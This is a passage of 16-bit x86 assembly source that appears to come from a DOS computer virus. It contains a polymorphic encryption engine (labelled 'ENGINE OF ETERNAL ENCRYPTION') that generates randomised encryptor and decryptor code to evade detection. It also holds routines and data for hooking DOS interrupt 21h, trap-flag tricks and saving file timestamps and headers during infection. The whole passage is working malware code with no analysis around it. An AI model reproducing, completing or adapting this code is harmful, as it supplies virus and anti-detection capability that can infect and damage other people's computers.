		mov	ah,[si+1]
		add	ah,[si+4+1]
		add	ah,0c0h-6
		stosw
		retn
	
seg2stack:	
		mov	al,[si+1]
		stosb
		retn

drop_prefix:	cmp	al,DSs
		je	dp_x	
		add	al,20h
		stosb
dp_x:		retn

random_g_mem:	mov	ax,248
		call	random
		add	ax,offset gb_mem
		retn

orah:		cmp	[lock_ind],1
		jnz	ora1
		call	decision
		jz	ora2
ora1:		or	ah,6
		stosw
		mov	ax,[si].mcm_ofs
		stosw
		retn
ora2:		or	ah,[mind]
		stosw
		mov	ax,[si].mcm_ofs
		sub	ax,[ug]
		stosw
		retn
COMl	macro	s0,s1,s2,s3
	mov	ax,&s0+&s1*100h
	mov	bx,&s2+&s3*100h
	endm

COMh	macro	d0,d1,d2,d3
	mov	cx,&d0+&d1*100h
	mov	dx,&d2+&d3*100h
	call	recurser
	endm

COMx	macro	s0,s1,s2,s3,d0,d1,d2,d3
	mov	ax,&s0+&s1*100h
	mov	bx,&s2+&s3*100h
	mov	cx,&d0+&d1*100h
	mov	dx,&d2+&d3*100h
	call	recurser
	endm
cx_size	equ	4*3+1

get_random_reg:
	mov ax,7
	call	random
	test	al,4
	jz	grr
	inc	al
grr:	retn

gen_em: call	get_random_reg
        mov [use_reg],al
gend:	call	get_ind
	cmp	al,[use_reg]
	je	gend
        mov [indy],al
	call	reg2adr
	or	al,80h
	mov [mind],al
	mov [lock_reg],1
	mov [lock_ind],2
retn

gen_disable:

	call	gen_em
	mov	ax,offset disable_data
	call	gen_c
	mov	al,0CFh				
	stosb
	retn

gen_enable:
	call	gen_em
	mov	ax,offset enable_data
	call	gen_c
	mov	al,0CFh			
	stosb

	retn

gen_c:	cld
	push	di
	mov	si,offset buf2
sl:	call	ax
sx:	mov	byte ptr [si],0ffh
	pop	di
	mov	si,offset buf2
	call	compiler
	retn

enable_data:
	mov	al,t_reg
	mov	ah,[use_reg]
	COMh	t_stack,0,0,0
	mov	al,t_reg
	mov	ah,[indy]
	COMh	t_stack,0,0,0
	call	random0
	xchg	ax,bx
	mov	al,t_const
	mov	[ug],bx
	mov	cl,t_reg
	mov	ch,[indy]
	call	recurser	
	COMx	t_seg,DSs,0,0		t_stack,0,0,0
	COMx	t_const,0,0,0		t_seg,DSs,0,0
	COMl	t_mem,DSs,4,0
	mov	cx,t_mem+100h*CSs
	mov	dx,[__old_1]
	call	recurser
	COMl	t_mem,DSs,6,0
	mov	cx,t_mem+100h*CSs
	mov	dx,[__old_1]
	inc	dx
	inc	dx
	call	recurser

	mov	ax,t_mem+256*CSs
	mov	bx,[__engine]
	COMh	t_mem,DSs,4,0
	COMx	t_seg,CSs,0,0,		t_mem,DSs,6,0
	COMx	t_stack,0,0,0,		t_seg,DSs,0,0
	COMl	t_stack,0,0,0
	mov	cl,t_reg
	mov	ch,[indy]
	call	recurser
	COMl	t_stack,0,0,0
	mov	cl,t_reg
	mov	ch,[use_reg]
	call	recurser

aax:	mov	ax,1000h		; 0..0fff	OF DF IF TF SF ZF
	call	random
	or	ah,3			
	mov	bx,ax
	mov	al,t_const
	mov	cl,t_stack
	dec	[lock_reg]
	call	recurser

	COMx	t_seg,CSs,0,0,		t_stack,0,0,0
	mov	al,t_const
	mov	bx,MK
	COMh	t_stack,0,0,0
	retn

disable_data:
	mov	al,t_reg
	mov	ah,[use_reg]		
	COMh	t_stack,0,0,0
	mov	al,t_reg
	mov	ah,[indy]
	COMh	t_stack,0,0,0
	call	random0
	xchg	ax,bx
	mov	al,t_const
	mov	[ug],bx
	mov	cl,t_reg
	mov	ch,[indy]
	call	recurser	
	COMx	t_seg,DSs,0,0		t_stack,0,0,0
	COMx	t_const,0,0,0		t_seg,DSs,0,0
	mov	ax,t_mem+100h*CSs
	mov	bx,[__old_1]
	COMh	t_mem,DSs,4,0
	mov	ax,t_mem+100h*CSs
	mov	bx,[__old_1]
	inc	bx
	inc	bx
	COMh	t_mem,DSs,6,0

	COMx	t_stack,0,0,0		t_seg,DSs,0,0
	COMl	t_stack,0,0,0		
	mov	cl,t_reg
	mov	ch,[indy]
	call	recurser
	COMl	t_stack,0,0,0		
	mov	cl,t_reg
	mov	ch,[use_reg]
	call	recurser
	retn
gen_engine:
	cld
	call	gen01                   
	jmp	pushq                   
mk1:	jmp	gen02
mk6:	retn

get_ind:mov     ax,3
	call    random
        jnz     g1x
        sub     al,2
g1x:    add     al,5
        retn

gen01:  call    get_ind	
	mov	[i0],al
g1a:    call    get_ind
	cmp	[i0],al
	je	g1a
	mov	[i1],al
	call    get_ind
	mov	[i2],al
	call	decision
	mov	[s0],al
	retn

pushq:	mov	[sp1],sp
	mov	dx,sp
	sub	ah,ah
	cld
	mov	si,offset i0
	mov	cl,100h-3
pq0:	lodsb
	or	al,50h	
	call	isin
	je	pq6
	push	ax
pq6:	inc	cl
	jnz	pq0

pq2:	mov	al,[si]
	call	seg_push
	add	al,6
	push	ax

	mov	bx,sp
	mov	dx,[sp1]
	sub	dx,bx
	call	chaos		

	mov	si,[sp1]

pq3:	dec	si
	dec	si
	mov	al,ss:[si]
	stosb			
	cmp	si,sp
	jne	pq3
	jmp	mk1

popq:
pq5:	pop	ax
	inc	al		
	test	al,40h
	jz	pq4		
	add	al,7
pq4:	stosb
	cmp	[sp1],sp
	jne	pq5
	jmp	mk2


gen02:	mov	[sp2],sp
	xor	si,si
	mov	cl,100h-4
	push	si
	push	si
g2a:	push	si
	lodsw			
	inc	cl
	jnz	g2a
	mov	ax,5
	call	random
	add	ax,2		
	xchg	cx,ax
g2b:	mov	ax,7
	call	random
	push	ax
	dec	cx
	jnz	g2b

	mov	bx,sp
	mov	dx,[sp2]
	sub	dx,bx
	call	chaos		

mk3:	mov	si,offset buf2
	mov	al,[i0]
	mov	[use_reg],al
	mov	ax,t_seg+100h*CSs
	mov	cl,al
	mov	ch,DSs
	call	recurser	

	mov	ch,[i1]
	mov	[use_reg],ch

	mov	ch,[i0]
	mov	cl,t_reg
	mov	ax,t_reg+4*256
	call	recurser

	mov	ch,[i1]
	mov	ax,t_mem+100h*CSs
	mov	bx,[__oldptr]
	mov	cl,t_reg
	call	recurser

	mov	byte ptr [si],0ffh
	mov	si,offset buf2
	call	compiler

	mov	[ec_new],di		
	mov	[neg00],0
	mov	al,[i1]
	call	reg2adr
xx2:	mov	[adr00],al
	mov	al,[s0]
	mov	[seg00],al

	mov	si,sp
	mov	[sp3],si
	cld
xx1:	lods	word ptr ss:[si]
	mov	[ofs00],al
	push	word ptr [rseed]
	push	word ptr [rseed+2]
	mov	al,[i1]			
xx3:	mov	[reg00],al
	call	gen00
	cmp	si,[sp2]
	jne	xx1
	mov	[ecn_end],di		

	mov	al,[i0]
	call	reg2adr
	mov	ah,byte ptr [sp1]	
	sub	ah,byte ptr [sp2]
	xchg    ax,bx			
        call    decision
        jz      fuck_1
	mov	ax,08b36h			
	stosw
        xchg    ax,bx
	mov	bl,[i2]
	shl	bl,3
	or	al,01000000b
	or	al,bl
        stosw
        jmp     short fuck_2
fuck_1: mov     ax,0ff36h
        stosw                           
        xchg    ax,bx
        or      al,070h
        stosw
        mov  ch,[i2]
        mov  [use_reg],ch

        mov  ax,t_stack
        mov  cl,t_reg
        mov  si,offset buf2
       	call	recurser

	mov	byte ptr [si],0ffh
	mov	si,offset buf2
	call	compiler
fuck_2:
	mov	[dc_new],di

	mov	[neg00],1

	mov	al,[i2]
	call	reg2adr
xb2:	mov	[adr00],al
	mov	al,[s0]
	mov	[seg00],al

	mov	si,[sp2]
xb1:	dec	si
	dec	si
	mov	ax,ss:[si]
	mov	[ofs00],al
	pop	word ptr [rseed+2]
	pop	word ptr [rseed]
	mov	al,[i2]
	mov	[reg00],al

	call	gen00
	cmp	si,[sp3]
	jne	xb1
	mov	ax,[sp2]
	sub	ax,sp				
	add	sp,ax
	mov	[dcn_end],di
	mov	ah,[i2]
	mov	[use_reg],ah
	mov	si,offset buf2
	mov	cx,t_mem+100h*CSs
	mov	dx,[__oldptr]
	mov	al,t_reg
	
	call	recurser
	mov	byte ptr [si],0ffh
	mov	si,offset buf2
	call	compiler

	jmp	popq
mk2:	mov	al,0cfh		
	stosb
	jmp	mk6

gen00:	mov	ax,4
	call	random
	or	al,al
	jnz	g0d
	mov	al,2eh		
	jmp	g0c
g0d:	mov	al,[seg00]
	or	al,al
	jnz	g0e		
	mov	al,26h
g0c:	stosb
g0e:
	mov	ax,tab00size*4	
	call	random
	and	al,0fch
        mov     bx,ax
	add	ax,offset tab00
	call	ax

	mov	dl,[neg00]
	test	ah,dl
	jz	g0h
	xor	bl,4                    
        mov     ax,bx
        add     ax,offset tab00
        call    ax

g0h:	and	ah,0feh
	or	ah,[adr00]		
	cmp	bl,offset trg00-offset tab00
	jae	g0g
	mov	dl,[reg00]
	shl	dl,3			
	or	ah,dl
g0g:	cmp	[ofs00],0
	jne	g0a
	and	ah,03fh
	stosw
	jmp	g0f
g0a:	stosw
	mov	al,[ofs00]
	stosb
g0f:	cmp	bl,offset tim00-offset tab00
	jb	g0b
	call	random0
	stosw
g0b:	retn

tab00:	db	0B8h,001h,01000001b,0c3h	; add ,reg
	db	0B8h,029h,01000001b,0c3h	; sub
	db	0B8h,031h,01000000b,0c3h	; xor
trg00:
	db	0b8h,0f7h,01011000b,0c3h	; neg
	db	0b8h,0ffh,01000001b,0c3h	; inc
	db	0b8h,0ffh,01001001b,0c3h	; dec
	db 	0b8h,0d0h,01000001b,0c3h	; rol ,1  - byte
	db	0b8h,0d0h,01001001b,0c3h	; ror ,1  - byte
	db	0b8h,0f7h,01010000b,0c3h	; not
tim00:
	db	0b8h,081h,01110000b,0c3h	; xor
	db	0b8h,081h,01000001b,0c3h	; add ,immw
	db	0b8h,081h,01101001b,0c3h	; sub

tab00end	label
tab00size	equ (offset tab00end-offset tab00)/4

chaos:	pusha
	push	ds
	push	ss
	pop	ds
	mov	cx,dx		
ch0:	mov	ax,dx
	call	random
	and	al,0feh
	mov	si,ax		
	mov	ax,dx
	call	random
	and	al,0feh
	mov	di,ax		
	mov	ax,[si+bx]
	xchg	ax,[di+bx]
	mov	[si+bx],ax	
	dec	cx
	jnz	ch0
	pop	ds
	popa
	retn

isin:	pusha
	mov	si,sp
	add	si,16+2			
ii1:	cmp	si,dx
	je	ii2
	cmp	ss:[si],ax
	je	ii0
	inc	si
	inc	si
	jmp	ii1

ii2:	inc	si
ii0:	popa
	retn	

seg_push:
	or	al,al
	jz	sp_xx
	mov	al,18h
sp_xx:	retn

reg2adr:
	sub	al,2
	cmp	al,1
	jne	r2a
	mov	al,7
r2a:	retn


getlost_po:	mov	ax,[dcn_end]
		add	ax,[b2]
		mov	[dco_end],ax
		mov	ax,[dc_new]
		add	ax,[b2]
		mov	[dc_old],ax
		
		mov	si,[__old_1]
		mov	[old1_ofs],si
		pop	[si+2]	
		pop	[si]
		mov	ax,[m1]
		mov	[si+4],ax	

		call	gen_preint
onmt:		mov	ax,18h
		call	random
		add	al,40h
		cmp	al,50h
		jb	okaa
		add	al,40h
okaa:		mov	byte ptr [start_v],al	
		and	al,7
		cmp	al,4
		je	onmt
		push	cs
		pop	es
		mov	si,offset rcpt
		mov	di,offset safe
		movsw
		movsb

		mov	cx,[bitch]
		call	fake_seg
		xor	di,di
		xor	si,si
		shr	cx,1
		rep	movsw
		mov	di,cs:[bitch]
		add	di,decr_code
		mov	cx,offset c_aft+1
		sub	cx,di
		shr	cx,1
		rep	movsw
				

		call	fake_seg
		xor	si,si
		mov	di,offset c_aft
		mov	cx,cs:[__old_1]
		sub	cx,di
		rep	movsb
		add	di,gb_len
		mov	cx,offset start_v
		sub	cx,di
		rep	movsb
		mov	di,offset dil_heap
		mov	cx,dil_len/2
		rep	movsw		
		call	cr_randomize

		push	cs
		pop	ds

		retn

MORPH:		pusha
		mov	di,sp
		mov	cl,0
		mov	al,0ffh
		db 'ENGINE OF ETERNAL ENCRYPTION'
		mov	ax,di
		sub	ax,sp
		add	sp,ax
		popa

		call	POWERUP
		push	cs
		pop	ds

		mov	al,byte ptr [dis_val]	
		mov	byte ptr [rcpt],al

pre_prepare:    call    dil_gen
		mov	si,[old1_ofs]
		push	[si]		
		push	[si+2]

		push	cs
		pop	ds

		mov	ax,sp
		shr	ax,4
		mov	bx,ss
		add	ax,bx
		add	ax,ss_distance

		mov	[empty_seg],ax			
		mov	si,[ecn_end]
		push	[si]
		mov	byte ptr [si],0c3h		
		xor	ax,ax
		mov	es,ax
		mov	[sp_tmp],sp	
		pusha		
		pusha

		push	TF
		push	cs
		push	offset start_v+1
		mov	si,[dco_end]
		mov	[oldptr_2],offset pred+1
		
		push	offset prepare_re

		push	0
		push	cs
		push	offset rcpt
END_offset:	iret	
		nop

		db Maxinst dup (?)
endv:
heapbeg:

block_beg	dw offset block-offset start	
block_len	dw 1			  

dc_old		dw offset dc_oldx
dco_end		dw offset dc_oldx

old1_ofs	dw	offset old1
disable__	dw	offset disable

old_ss		dw	?	
old_sp		dw	?
old_ip		dw	?		
old_cs		dw	?

ent__		dw	offset ent_+1
bitch		dw 100h	
dis_val:	retn			

data_12e:

d_beg:
rcpt:
rcBUF		db 8+2 dup (?)		
UMB_link	dw ?
UMB_strategy	dw ?

old_21		dd	?	
d_end:
dataend:
block:		retn

dil_len         equ 12aeh-1199h+1+4
getlost		label
prepare_re	equ getlost+59h
reCRYPT		equ getlost+69h
dil_heap        db dil_len dup (?)
ec_new		dw ?
dc_new		dw ?
ecn_end		dw ?
dcn_end		dw ?
temp_seg	dw ?
b2		dw ?				; bitch II
safe		db 3 dup(?)	

oldptr_2	dw ?		
m1		dw ?		
len_add		dw ?
new_enable	db decr_code dup (?)

sp_tmp		dw ?
time		dw ?
date		dw ?
buffer		db headerlen dup (?)
create		dw ?
empty_seg	dw ?
hook21		dw ?,?

seg00	db	?		
reg00	db	?	
adr00	db	?		
ofs00	db	?	
neg00	db	?

i0	db	?
i1	db	?
i2	db	?
s0	db	?

sp1	dw	?
sp2	dw	?
sp3	dw	?

use_reg	db	?	
indy	db	?
mind	db	?
ug	dw	?	
lock_ind db	?
lock_reg db	?	
temp	dw	?
buf2	db 400h	dup (?)

__old_1		dw	?
__entry		dw	?
__engine	dw	?
__oldptr	dw	?
__ks		dw	?

rseed  dw ?,?
rtemp  dw ?

heapend:
temp_buf:

end start
